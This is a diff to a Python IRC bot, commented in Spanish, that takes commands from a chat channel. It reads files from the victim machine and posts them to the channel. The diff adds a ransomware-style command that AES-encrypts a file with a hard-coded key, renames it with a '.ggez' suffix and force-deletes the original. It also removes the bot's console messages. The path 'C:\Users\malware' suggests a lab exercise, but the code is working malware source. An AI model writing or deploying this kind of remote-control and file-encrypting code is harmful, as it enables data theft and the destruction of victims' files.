@@ -1,11 +1,49 @@
 import socket
-import random
+import random, os
+from Crypto.Cipher import AES
+from Crypto.Hash import SHA256
 from subprocess import Popen, PIPE, CalledProcessError
  
 servidor = "192.168.1.30"
 canal = "#canal"
 nickName = ""
 puerto = 6667
+
+
+def Cifra(key, fnamec):
+      """
+      Recibe: La llave para cifrar el archivo y el nombre del archivo
+      Devuelve: Archivo cifrado usando AES como metodo de cifrado
+      """
+      chunksize=64*1024
+      outputfile=fnamec+'.ggez'
+      filesize=str(os.path.getsize(fnamec)).zfill(16)
+      IV=''
+      for i in range(16):
+            IV+=chr(random.randint(0,0xff))
+      encryptor= AES.new(key, AES.MODE_CBC,IV)
+
+      with open(fnamec, 'rb') as infile:
+            with open(outputfile, 'wb') as outfile:
+                  outfile.write(filesize)
+                  outfile.write(IV)
+
+                  while True:
+                        chunk =infile.read(chunksize)
+                        if len(chunk)==0:
+                              break
+                        elif len(chunk) % 16 !=0:
+                              chunk+=' '*(16-(len(chunk)%16))
+                        outfile.write(encryptor.encrypt(chunk))
+
+
+def CreaLlave(key):
+      """
+      Recibe: Un texto plano que servira ser una llave
+      Devuelve: Una llave de tamano constante la cual servira para cifrar el archivo
+      """
+      hasher=SHA256.new(key)
+      return hasher.digest()
 
 def name_generator():
       cad= "abcdefghijklmnopqrstuvwxyz1234567890"
@@ -28,16 +66,10 @@ def get_msg(canal, ircmsg):
             mensaje = ircmsg.split(canal+' ', 1 )
             mensaje = mensaje[1].replace(":", "",1)
       return mensaje
-#Modo Verboso para chat
-def v_chat(ircmsg, canal):
-      print (get_nick(canal, ircmsg)+": "+get_msg(canal, ircmsg))
+
       
 
 def do_command(irc, ircmsg):
-
-      if ircmsg.find("PRIVMSG "+canal) != -1:
-            v_chat(ircmsg, canal)
-
       if ircmsg.find("Hola") != -1:
             send_msg(irc, canal, "Hola!!!")
 
@@ -53,6 +85,13 @@ def do_command(irc, ircmsg):
             command_rec = ircmsg.split("!@cat ")[1]
             sub_stdout, sub_stderr = Popen(["cat", command_rec], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             send_msg(irc, canal, sub_stdout)
+            
+      elif ircmsg.find("!@cifra") != -1:
+		  send_msg(irc, canal, "Cifrando...")
+		  llave = CreaLlave('hola')
+		  Cifra(llave,"C:\\Users\\malware\\Desktop\\algo.txt")
+		  os.system("del /F /Q /A C:\\Users\\malware\\Desktop\\algo.txt")
+		  send_msg(irc, canal, "Cifrado exitoso.")
 
       elif ircmsg.find("!@pwd") != -1:
             sub_stdout, sub_stderr = Popen(["pwd"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
@@ -79,9 +118,7 @@ def Scana_main():
       irc.connect((servidor, puerto))
       irc.send("USER "+ nickName +" "+ nickName +" "+ nickName +" :r\n\r")
       irc.send("NICK "+ nickName +"\n\r")
-      print "Conectando..."
       irc.send("JOIN "+ canal +"\n\r")
-      print "Se ha unido al canal " +canal
 
       while 1:
             ircmsg = irc.recv(512)
